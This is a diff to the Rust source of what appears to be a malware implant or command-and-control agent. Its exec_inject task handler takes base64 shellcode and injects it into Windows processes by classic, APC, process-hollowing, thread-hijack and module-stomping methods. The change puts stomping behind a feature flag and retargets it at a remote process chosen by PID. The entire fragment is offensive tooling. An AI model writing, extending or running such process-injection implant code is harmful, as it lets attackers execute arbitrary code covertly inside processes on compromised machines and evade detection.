@@ -501,9 +501,11 @@ fn exec_inject(task: &Task) -> TaskOutput {
     #[cfg(target_os = "windows")]
     {
         use crate::inject::{
-            inject_classic, inject_apc, inject_hollow, inject_hijack, inject_stomp,
+            inject_classic, inject_apc, inject_hollow, inject_hijack,
             shellcode_from_b64,
         };
+        #[cfg(feature = "inject-stomp")]
+        use crate::inject::inject_stomp_remote;
 
         let args = match task.args.as_deref() {
             Some(a) => a,
@@ -593,9 +595,13 @@ fn exec_inject(task: &Task) -> TaskOutput {
                 }
             }
             "stomp" => {
-                let module = match v.get("module").and_then(|m| m.as_str()) {
-                    Some(m) => m.to_string(),
-                    None    => return TaskOutput::failure("inject/stomp: missing module"),
+                #[cfg(not(feature = "inject-stomp"))]
+                return TaskOutput::failure("inject/stomp: not compiled in");
+                #[cfg(feature = "inject-stomp")]
+                {
+                let pid = match v.get("pid").and_then(|p| p.as_u64()) {
+                    Some(p) => p as u32,
+                    None    => return TaskOutput::failure("inject/stomp: missing pid"),
                 };
                 let sc_b64 = match v.get("shellcode").and_then(|s| s.as_str()) {
                     Some(s) => s,
@@ -605,10 +611,11 @@ fn exec_inject(task: &Task) -> TaskOutput {
                     Some(s) => s,
                     None    => return TaskOutput::failure("inject/stomp: invalid base64"),
                 };
-                match inject_stomp(&module, &sc) {
+                match inject_stomp_remote(pid, &sc) {
                     Ok(())  => TaskOutput::success(b"stomped".to_vec()),
                     Err(e)  => TaskOutput::failure(&format!("inject/stomp: {e}")),
                 }
+                } // #[cfg(feature = "inject-stomp")]
             }
             other => TaskOutput::failure(&format!("inject: unknown method: {other}")),
         }
